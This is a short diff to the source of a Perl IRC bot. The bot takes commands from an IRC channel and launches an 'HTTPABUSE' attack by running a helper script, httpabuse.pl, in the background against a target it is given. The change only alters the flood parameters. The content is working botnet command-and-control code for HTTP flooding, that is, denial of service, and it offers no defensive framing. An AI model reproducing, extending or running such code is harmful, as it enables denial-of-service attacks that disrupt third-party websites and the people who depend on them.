@@ -154,7 +154,7 @@ while ( my $log = <$s0ck3t> ) {
         $target_httpabuse =~ s/^\s*(.*?)\s*$/$1/;
         $target_httpabuse;
         print $s0ck3t "PRIVMSG $channel :67[63HTTPABUSE67]61 Attack started at $1, use !stopabuse for stop :P \r\n";
-        system("nohup perl httpabuse.pl $target_httpabuse 2500 200 GET 13.37 > /dev/null 2>&1 &");
+        system("nohup perl httpabuse.pl $target_httpabuse 1100 110 GET 13.37 > /dev/null 2>&1 &");
       }
       
       if ( $log =~ m/:!stopabuse/g ){##########
